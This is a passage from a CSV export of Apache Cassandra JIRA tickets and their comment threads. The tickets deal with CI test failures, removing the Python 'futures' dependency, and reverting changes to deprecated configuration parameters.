|org.apache.cassandra.cql3.KeywordTest.test[keyword TRIGGER isReserved false]|1 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.UnableToParseClientMessageTest.badHeader[version=4/v4]|1 of 59|CASSANDRA-16974?|;;;","14/Mar/22 18:22;brandon.williams;#999 isn't a good comparison because it was missing the commit above.;;;","14/Mar/22 18:25;smiklosovic;They dont seem to be correlated. I have looked at few of them already and it is mostly about timeouts.

Not sure if it is reliable info but I built some branch on top of current trunk today and I got like 11 failures only, mostly notoric ones related to upgrades 

https://ci-cassandra.apache.org/job/Cassandra-devbranch/1498/#showFailuresLink;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pip tries to install futures in py3,CASSANDRA-17393,13429345,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,18/Feb/22 14:19,27/May/22 19:25,13/Jul/23 08:40,15/Mar/22 10:58,4.0.4,4.1,4.1-alpha1,,,,CI,,,,0,,"We've seen this problem in CI, and it's also seen (albeit extraneously) on CASSANDRA-17293.  This ticket is to explore removing futures from requirements.txt, and it shouldn't be needed.",,bereng,bschoeni,e.dimitrova,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 15 10:58:37 UTC 2022,,,,,,,All,,,,"0|z0zq3c:",9223372036854775807,,,,smiklosovic,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/f3123a6538af511421582e1596d3daa24d9df1d6,,,,,,,,,cqlsh tests passing,,,,,"18/Feb/22 14:28;e.dimitrova;Removal of futures is part of my suggestion for 4.0 and trunk as part of the proposed solution in CASSANDRA-17351;;;","18/Feb/22 14:32;brandon.williams;I think the proper way to handle this is to explicitly make it only for python2 in setup.py, as the docs state: https://pypi.org/project/futures/;;;","18/Feb/22 14:43;bschoeni;This is a driver requirement, so it shouldn't need to be included for Cassandra.  Also, Python 2.x is EOL.;;;","18/Feb/22 14:44;brandon.williams;We still have to support it for branches < 4.0 though.;;;","18/Feb/22 14:45;e.dimitrova;Do we need it for 4.0 and trunk though?;;;","18/Feb/22 14:49;brandon.williams;No, that's what this is about.;;;","13/Mar/22 21:13;smiklosovic;[~bschoeni] would you mind to create a patch for this as suggested by [~brandon.williams] (if you follow the link) before trying to get CASSANDRA-17417 in? (cc [~bsong])

I think we need to do this for 3.0, 3.11, 4.0 and trunk but the trick is that it would be installed dynamically based on what Python version we run that in.;;;","13/Mar/22 21:31;e.dimitrova;{quote}bq. I think we need to do this for 3.0, 3.11, 4.0 and trunk but the trick is that it would be installed dynamically based on what Python version we run that in.
{quote}
Why removing it from 3.0 and 3.11? My understanding is that futures is a back port to Python2 which we still use in 3.0 and 3.11, no?;;;","13/Mar/22 21:40;smiklosovic;I mean that we might put this everyhere (into every branch) but it will be effectively installed only for 3.0 and 3.11, no?

{code}
setup(
    ...
    install_requires={
        'futures; python_version == ""2.7""'
    }
)
{code}

Or do we trully want to just remove it from 4.0 and trunk?;;;","13/Mar/22 22:29;bschoeni;[~e.dimitrova] yes, futures is only useful for 3.0 and 3.11.

It would seem the Cassandra python driver mentions this dependency, but for an earlier python version. 

The Cassandra python driver requirements.txt states:

------------------

futures <=2.2.0

Futures is not required for Python 3, but it works up through 2.2.0 (after which it introduced breaking syntax).

This is left here to make sure install -r works with any runtime. When installing via setup.py, futures is omitted

for Python 3, in favor of the standard library implementation.futures <=2.2.0

Futures is not required for Python 3, but it works up through 2.2.0 (after which it introduced breaking syntax).

This is left here to make sure install -r works with any runtime. When installing via setup.py, futures is omitted

for Python 3, in favor of the standard library implementation.

------------------

[https://github.com/datastax/python-driver/blob/master/requirements.txt]

 

 ;;;","13/Mar/22 22:56;bschoeni;[~smiklosovic]  I would propose changing 3.0 and 3.11 branches in requirement.txt, instead of setup, similar to the C* python driver.  This should prevent it from being installed with py3.

futures <=2.7.0

If we choose fix this, it should probably be separate from CASSANDRA-17417;;;","14/Mar/22 18:48;brandon.williams;Here's a [branch|https://github.com/driftx/cassandra/tree/CASSANDRA-17393] with futures removed and a [circle run|https://app.circleci.com/pipelines/github/driftx/cassandra/384/workflows/682ab722-ace7-439c-88e8-262c68e9ec1a].;;;","14/Mar/22 19:29;smiklosovic;https://github.com/driftx/cassandra/tree/CASSANDRA-17393;;;","14/Mar/22 19:51;smiklosovic;Yes, verified removing futures works for 4.0 and trunk.

+1;;;","15/Mar/22 10:58;smiklosovic;build of trunk: https://app.circleci.com/pipelines/github/instaclustr/cassandra/827/workflows/a3e20cae-6904-4da3-abfe-ac14764f3342;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test failure: dtest-offheap.counter_test.TestCounters.test_13691,CASSANDRA-17387,13428643,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Urgent,Fixed,brandon.williams,e.dimitrova,e.dimitrova,15/Feb/22 20:46,16/Feb/22 12:28,13/Jul/23 08:40,16/Feb/22 12:28,3.11.13,,,,,,Test/dtest/python,,,,0,,"This test fails only off heap on 3.11, hard to say when it started as it was always failing since we have Butler. Marking it critical as it shows breaking config change.
h3. Stacktrace

Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [main] 2022-02-10 05:06:27,462 DatabaseDescriptor.java (line 117) Fatal configuration error org.apache.cassandra.exceptions.ConfigurationException: Invalid yaml. Please remove properties [memtable_allocation_type] from your cassandra.yaml at org.apache.cassandra.config.YamlConfigurationLoader$MissingPropertiesChecker.check(YamlConfigurationLoader.java:137) at org.apache.cassandra.config.YamlConfigurationLoader.loadConfig(YamlConfigurationLoader.java:100) at",,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Feb 16 12:28:03 UTC 2022,,,,,,,All,,,,"0|z0zlsg:",9223372036854775807,,,,bereng,,,,Critical,,NA,,https://github.com/apache/cassandra-dtest/commit/941772dedd8cff44c32140dd2964dd18374ad419,,,,,,,,,disabling a test,,,,,"15/Feb/22 20:58;brandon.williams;I tested and 3.11 will startup fine with offheap_objects set, so something else is going on here, but it's not as bad as it appears on the surface.;;;","15/Feb/22 21:06;e.dimitrova;Great, thank you for the quick reaction, I suspect it might be a test issue but better to verify it. ;;;","15/Feb/22 23:00;brandon.williams;This test [only runs|https://github.com/apache/cassandra-dtest/blob/trunk/counter_test.py#L20] with offheap objects on 3.11, since they are disabled in 3.0. The tested scenario involves old counter shards, so it first [installs 2.0.17|https://github.com/apache/cassandra-dtest/blob/trunk/counter_test.py#L33]. In the case of offheap memtables, this is too late for the [dtest setup|https://github.com/apache/cassandra-dtest/blob/trunk/dtest_setup.py#L428] which is applied without discretion, so it's actually 2.0 complaining here about a parameter from the (not so near) future.  I don't see how this ever could have worked since the addition of offheap memtables to the dtests, and I don't think using them is particularly valuable for this test, so the simplest thing to do is skip this test when offheap is requested - [done here.|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17387];;;","16/Feb/22 09:00;bereng;We have history of this test in jenkins going back to January last year and it has [always|https://ci-cassandra.apache.org/job/Cassandra-3.11/320/testReport/junit/dtest-offheap.counter_test/TestCounters/test_13691_2/history/?start=25] failed. Hence +1 to Brandon's assessment assuming [this|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1428/] devbranch run succeeds.;;;","16/Feb/22 12:28;brandon.williams;CI looks nominal for the current state of 3.11, committed.  Thank you!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test failure: TestCqlshOutput failing tests ,CASSANDRA-17386,13428633,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,azotcsit,e.dimitrova,e.dimitrova,15/Feb/22 20:24,17/Feb/22 19:28,13/Jul/23 08:40,17/Feb/22 19:28,3.0.27,3.11.13,,,,,Test/unit,,,,0,,"The following TestCqlshOutput tests are failing consistently on 3.11 and as far as Butler goes, since the very beginning it started collecting data so I am not able to say at this point what exactly broke them:

Test_static_cf_output, test_boolean_output, test_count_output, test_string_output_ascii, test_null_output, test_columness_key_output, test_numeric_output",,azotcsit,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,azotcsit,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Feb 17 17:31:12 UTC 2022,,,,,,,All,,,,"0|z0zlq8:",9223372036854775807,,,,brandon.williams,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/63788661cb637ec0e80158dd7636d9f35256ccfd,,,,,,,,,I fixed test issue. No documentation updates are required.,,,,,"15/Feb/22 20:26;e.dimitrova;CC [~azotcsit] as I remember you were interested into those;;;","16/Feb/22 08:16;azotcsit;Thanks [~e.dimitrova]! I'm trying to find out the root cause for the second day and I'm not even close :D I'm fighting with my local environment in order to run these tests and get the same failures as we have in Jenkins...

The only thing I can say so far is that tests do not work with 2.7.18 because of [https://github.com/pypa/pip/commit/ca832b2836e0bffa7cf95589acdcd71230f5834e#diff-e58ec0adb9172e63c4f31031fb5a5b364fe9471e332bff30114233a002ee9d1eR142.] In order to run smth the tests you need Python <= 2.7.17. I feel at some point our CI may break because of this (I hope no-one will update Python to the latest version). I'll keep this ticket updated with the results of my research.;;;","16/Feb/22 11:18;azotcsit;Looks like I found the issue in tests configuration. CI looks good.

 
||Item||Link||
|PR|[https://github.com/apache/cassandra/pull/1450]|
|CI|[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1429/]|

 

[~e.dimitrova] would you mind reviewing the changes.;;;","16/Feb/22 18:04;brandon.williams;Do we know why this isn't failing on 3.0?;;;","16/Feb/22 18:33;azotcsit;Good point [~brandon.williams]! For 4.0 and 4.x the issue has been fixed in [this PR|https://github.com/apache/cassandra/commit/bf9a1d487b9ba469e8d740cf7d1cd419535a7e79#diff-4f28d77309cd96fadc18b2e74fb7a0c2c040ec6e68e551e1198eb2361c8a56a7R56].

I additionally checked 3.0 and looks like it has the same issue, however, it is not being reported.

Here are the details:

[https://ci-cassandra.apache.org/view/Cassandra%203.0/job/Cassandra-3.0/248/consoleFull] (latest 3.0):
{code:java}
14:42:08  Starting building: Cassandra-3.0-cqlsh-tests #305
{code}
and in [https://ci-cassandra.apache.org/job/Cassandra-3.0-cqlsh-tests/305/#showFailuresLink] there are _TestCqlshOutput_ failures. Any idea why these failures are not being reported as failures at [https://ci-cassandra.apache.org/view/Cassandra%203.0/job/Cassandra-3.0/248/#showFailuresLink]?

I was able to reproduce the issue for 3.0 locally. Hence I ported the same fix to 3.0 branch, tested locally and triggered CI.
||Item||Link||
|PR 3.11|[https://github.com/apache/cassandra/pull/1450]|
|CI 3.11|[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1429/] (looks good)|
|PR 3.0|[https://github.com/apache/cassandra/pull/1451/]|
|CI 3.0|[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1431/] (running now)|

 ;;;","16/Feb/22 19:03;brandon.williams;Hmm, those jobs are generated from a template, so I'm not sure why 3.11 would report a failure but 3.0 would not... maybe [~mck] has more insight.;;;","16/Feb/22 19:24;mck;bq. Hmm, those jobs are generated from a template, so I'm not sure why 3.11 would report a failure but 3.0 would not... maybe Michael Semb Wever has more insight.

Very odd. I'll need to look into that… ;;;","16/Feb/22 21:50;mck;bq. so I'm not sure why 3.11 would report a failure but 3.0 would not

In https://ci-cassandra.apache.org/view/Cassandra%203.0/job/Cassandra-3.0/248/consoleFull
there is the following…
{noformat}
11:55:51  ERROR: missing test xml files
11:55:51  ERROR: Unable to find project for artifact copy: Cassandra-3.0-cqlsh-test
{noformat}

But the cqlshlib.xml is there… e.g. and archived in https://nightlies.apache.org/cassandra/cassandra-3.0/Cassandra-3.0-cqlsh-tests/305/Cassandra-3.0-cqlsh-tests/cython=no,jdk=jdk_1.8_latest,label=cassandra/

Boils down to a typo here: https://github.com/apache/cassandra/blob/cassandra-3.0/.jenkins/Jenkinsfile#L161 
(the first argument to copyTestResults should be 'cqlsh-tests')
;;;","16/Feb/22 23:28;brandon.williams;Nice find, I've ninja'd that in c586cca2b3ca.;;;","17/Feb/22 06:52;azotcsit;Good catch!

In the meantime all the builds look good:
||Item||Link||
|PR 3.11|[https://github.com/apache/cassandra/pull/1450/]|
|CI 3.11|[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1429/]|
|CI 3.11 CQLSH|[https://ci-cassandra.apache.org/job/Cassandra-devbranch-cqlsh-tests/1281/]|
|PR 3.0|[https://github.com/apache/cassandra/pull/1451/]|
|CI 3.0|[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1431/]|
|CI 3.0 CQLSH|[https://ci-cassandra.apache.org/job/Cassandra-devbranch-cqlsh-tests/1283/]|
 ;;;","17/Feb/22 17:31;brandon.williams;Looks good, +1.  Thanks for fixing this!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix user_functions_test.py::TestUserFunctions::test_udf_overload,CASSANDRA-17383,13428435,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,manish.c.ghildiyal@gmail.com,e.dimitrova,e.dimitrova,14/Feb/22 22:34,27/May/22 19:25,13/Jul/23 08:40,17/Feb/22 20:08,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,CI,,,,0,,"user_functions_test.py::TestUserFunctions::test_udf_overload
is failing after CASSANDRA-17190 on all branches except trunk.

 ",,bereng,blerer,brandon.williams,e.dimitrova,manish.c.ghildiyal@gmail.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17190,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,manish.c.ghildiyal@gmail.com,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Feb 18 05:46:41 UTC 2022,,,,,,,All,,,,"0|z0zkig:",9223372036854775807,,,,bereng,brandon.williams,,,Low,,NA,,https://github.com/apache/cassandra-dtest/commit/c0fdfc4491cc1fcc687539b143df6c566d7e5e0a,,,,,,,,,See comments,,,,,"15/Feb/22 05:49;bereng;[~manish.c.ghildiyal@gmail.com] if you look around dtests you will notice there are ways to execute code conditionally depending on the version. You just need to amend the dtest to execute the old code <4.1 and the new one >=4.1. Let me know if you can't take this or need help and I can jump in.;;;","15/Feb/22 09:12;blerer;Sorry, I missed that part when I reviewed the patch.;;;","17/Feb/22 06:20;bereng;Hi [~manish.c.ghildiyal@gmail.com] just a quick check to ask if you think you'll get a gap to get around this? Otherwise we can jump in to help.;;;","17/Feb/22 06:35;manish.c.ghildiyal@gmail.com;Sorry for delay. Doing it immediately.

 

Note: Just made a commit.;;;","17/Feb/22 06:41;bereng;[~manish.c.ghildiyal@gmail.com] no hurries! I was just checking out as I remembered about this.;;;","17/Feb/22 07:48;bereng;Hi [~manish.c.ghildiyal@gmail.com] you mentioned a commit. Can you post the link please when it's ready?;;;","17/Feb/22 08:13;manish.c.ghildiyal@gmail.com;https://github.com/mghildiy/cassandra-dtest/commit/887413190f1c9a19b67495d9997f769daddb85fa;;;","17/Feb/22 09:31;bereng;Let's see how it goes:

CI [3.0|https://app.circleci.com/pipelines/github/bereng/cassandra/591/workflows/e9e0932b-6fe6-411e-9efc-d7007db59218]
CI [3.11|https://app.circleci.com/pipelines/github/bereng/cassandra/592/workflows/6774a5d2-b74a-4576-9960-62a78ebb092d]
CI [4.0|https://app.circleci.com/pipelines/github/bereng/cassandra/593/workflows/a23ce84a-167a-437f-94da-fe4181113075]
CI [trunk|https://app.circleci.com/pipelines/github/bereng/cassandra/594/workflows/2bb2916a-b9bd-4855-b711-be90d5821356];;;","17/Feb/22 10:33;bereng;[~manish.c.ghildiyal@gmail.com] there are plenty failures in the trunk CI. I have investigated a bit and I think this is because your commit is on a dtests/trunk version that it's a few days old. Could you rebase to the current trunk? If you're too busy please feel free to ask for help and I could do that for you as always :-);;;","17/Feb/22 11:12;manish.c.ghildiyal@gmail.com;Updated the commit.;;;","17/Feb/22 11:54;bereng;Ok it seems the j8 failures are a current problem in CI but j11 is green. So now let's wait for some other committer's input. Thx for your work [~manish.c.ghildiyal@gmail.com]!;;;","17/Feb/22 11:58;brandon.williams;+1;;;","17/Feb/22 20:08;brandon.williams;Committed, thank you!;;;","18/Feb/22 05:46;bereng;I don't see udf failures anymore in the branches CI. Thanks [~manish.c.ghildiyal@gmail.com] for your help.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revert removed old deprecated parameters and revert name change of user_defined_function_warn_timeout and user_defined_function_fail_timeout in Config,CASSANDRA-17378,13428205,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,13/Feb/22 17:53,27/May/22 19:25,13/Jul/23 08:40,25/Feb/22 18:02,4.1,4.1-alpha1,,,,,Build,,,,0,,"Based on the latest ML conversations, the following changes in Config should be reconsidered:

[https://github.com/apache/cassandra/commit/c51a7c66fc21ca2da08b89ae5f9b4817ee4d8c23]
 * max_streaming_retries - deprecated long time ago but it should be there until at least 5.0. We need to revert this change
 * user_defined_function_warn_timeout_in_ms and user_defined_function_fail_timeout_in_ms name changes were reverted and type will be changed as part of another patch, already in the making.
 * Cherry-pick [https://github.com/apache/cassandra/commit/537ad9e17b820e48df78a7edfe6b3a17d56e08bc]",,dcapwell,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Feb 28 15:56:58 UTC 2022,,,,,,,All,,,,"0|z0zj3c:",9223372036854775807,,,,dcapwell,,,,Low,,,,https://github.com/apache/cassandra/commit/65fcc79b628a7e415b57c27c596ea1cb5e67211d and https://github.com/apache/cassandra/commit/12e2c159f86b223df1c2018c8a395a805b11956e,,,,,,,,,"Patch  [here|https://github.com/apache/cassandra/commit/5bea69f0f6563fc51230b96adbd6066dd1d80315]. CI run [J8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1395/workflows/ca0427b3-da1b-45aa-9eb5-26831ed3cfdc], [J11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1395/workflows/bd556ef1-525c-4635-bf9b-7694ed2888c3]",,,,,"15/Feb/22 20:16;e.dimitrova;I ended up only reverting the name change to those three parameters. I want to give a bit of a break to ccm in the moment while we stabilize CI, etc. I will change them later. 

Patch  [here|https://github.com/apache/cassandra/commit/5bea69f0f6563fc51230b96adbd6066dd1d80315]. CI run [J8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1395/workflows/ca0427b3-da1b-45aa-9eb5-26831ed3cfdc], [J11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1395/workflows/bd556ef1-525c-4635-bf9b-7694ed2888c3]

There are already tickets for all CI issues

[~dcapwell] do you mind to review? ;;;","21/Feb/22 20:51;dcapwell;LGTM.  We talked about https://github.com/apache/cassandra/pull/1335 doing the conversion, if you want you can copy the logic into this patch, else that one will do the conversion.;;;","23/Feb/22 20:03;e.dimitrova;[~dcapwell], sorry, now I remember, so you won't change the name only the type. CCM change won't be needed. I totally forgot of that change, you absolutely told me about, I remembered only the typo fix before...

I will commit the current patch to fix those two renames and when [CASSANDRA-17166|https://github.com/dcapwell/cassandra/compare/CASSANDRA-17166] lands the new conversion will be added. 

Considering we are still not bumping to 5.0 but only 4.1 I will also cherry-pick [this patch|https://github.com/apache/cassandra/commit/537ad9e17b820e48df78a7edfe6b3a17d56e08bc]. (We committed it only to 4.0 to fix the release issue we had that weekend)

If something changes and we want to bump to 5.0 and really remove all those, we can do that. What do you think? If you agree I will cherry-pick it and run CI again.;;;","24/Feb/22 22:04;dcapwell;I am cool with the patch adding back all configs and leaving type change to CASSANDRA-17166.  Thanks for adding in https://github.com/apache/cassandra/commit/537ad9e17b820e48df78a7edfe6b3a17d56e08bc, this will let me remove the special case from my diff test.

bq. If something changes and we want to bump to 5.0 and really remove all those, we can do that

when trunk turns into 5.0, then works for me;;;","25/Feb/22 00:05;e.dimitrova;Great, thanks, while working on the patch I ended up also opening ticket CASSANDRA-17404 to return windows_time_interval in trunk as it was removed without deprecation in CASSANDRA-16956 and we are also still considering trunk to release to 4.1.

Rebased the branch, cherry-picked the agreed commit. Starting CI:

[trunk|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17378-trunk?expand=1] - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1404/workflows/5bb5412a-87a9-4b5f-94bd-ab0cd618e0b9], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1404/workflows/e661e69b-bfb6-4059-9c79-f9b4c33f416d];;;","25/Feb/22 17:17;e.dimitrova;There are a few failures but nothing related:
 * udf_overload was fixed but the fix is not in the DTest branch I was testing with.
 * Upgrade tests failures are known and we have ticket - CASSANDRA-17140
 * bootstrapTest - seems like flaky test and there is no open ticket. I see this failure with a few patches in CircleCI with Midres today and I found one failure in Butler. I will raise a ticket. Unrelated to this patch.

Starting commit soon;;;","25/Feb/22 18:01;e.dimitrova;Committed in two patches:

To https://github.com/apache/cassandra.git

   769f6b3122..12e2c159f8  trunk -> trunk

 

NOTE: CHANGES.txt and NEWS.txt are not updated, (only forward port the NEWS.txt entry from CASSANDRA-17377) as those should be documented things in CASSANDRA-15234, documentation in progress in CASSANDRA-17246, link will be added [here| https://github.com/apache/cassandra/blob/trunk/NEWS.txt#L110-L111].;;;","28/Feb/22 15:56;jmckenzie;ASF CI looks clean w/regards to this work

 

[CI Results]
Branch: trunk, build number: 974
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-trunk/974/]
JIRA: CASSANDRA-17378
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=12e2c159f86b223df1c2018c8a395a805b11956e]
affected paths:
 * src/java/org/apache/cassandra/config/Config.java
 * src/java/org/apache/cassandra/config/DatabaseDescriptor.java
 * src/java/org/apache/cassandra/config/Config.java
 * NEWS.txt

Build Result: UNSTABLE
Passing Tests: 44660
Failing Tests: 5
||Test|Failures|JIRA|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade_with_internode_ssl|16 of 30|CASSANDRA-17306?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade|16 of 30|CASSANDRA-17306?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|16 of 30|CASSANDRA-17306?|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome|1 of 30|CASSANDRA-17301?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade|16 of 30|CASSANDRA-17306?|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revert CASSANDRA-17132 and instead deprecate the parameters and update NEWS.txt,CASSANDRA-17377,13428106,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,11/Feb/22 23:05,13/Feb/22 01:55,13/Jul/23 08:40,13/Feb/22 01:52,4.0.3,,,,,,Build,,,,0,,"Follow up on [https://lists.apache.org/thread/z5zmv284cxfm5ljr0fogqr2fxbc9kwlw]

by revert and instead deprecate the parameters removed in CASSANDRA-17132.",,brandon.williams,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17376,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Degradation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sun Feb 13 01:52:15 UTC 2022,,,,,,,All,,,,"0|z0zihc:",9223372036854775807,,,,brandon.williams,e.dimitrova,,,Low,,4.0.2,,https://github.com/apache/cassandra/commit/537ad9e17b820e48df78a7edfe6b3a17d56e08bc,,,,,,,,,"Patch [here|https://github.com/ekaterinadimitrova2/cassandra/commit/a0f6b89127c1955a422dec922fb2624b4dbffd84]

 ",,,,,"12/Feb/22 00:16;e.dimitrova;Patch  [here|https://github.com/ekaterinadimitrova2/cassandra/commit/4cc1d8d9c5b75780b38616519147c91ec32e25c4]

[~jjirsa] , [~brandon.williams] , is this enough? ADOCS are already to be updated in CASSANDRA-17135. They will require more work in the other repo. I don't see a reason to delay this one in the meantime. ;;;","12/Feb/22 00:20;e.dimitrova;Disregard, I pushed wrong commit trying to be quick... I will test and push the right one...;;;","12/Feb/22 01:26;e.dimitrova;So in CASSANDRA-17132 I removed from cassandra.yaml also otc_backlog_expiration_interval_ms which I found It removed from Config class as part of CASSANDRA-15066 (the rewrite of the internode messaging subsystem).  I guess it is just a good luck no one complained of missing it before.

I didn't manage to identify NEWS.txt or CHANGES.txt entries for it so I added it back as deprecated in Config.java now, even if it wasn't removed by me. As a placeholder as the others just for clarity and to be on the safe side. 

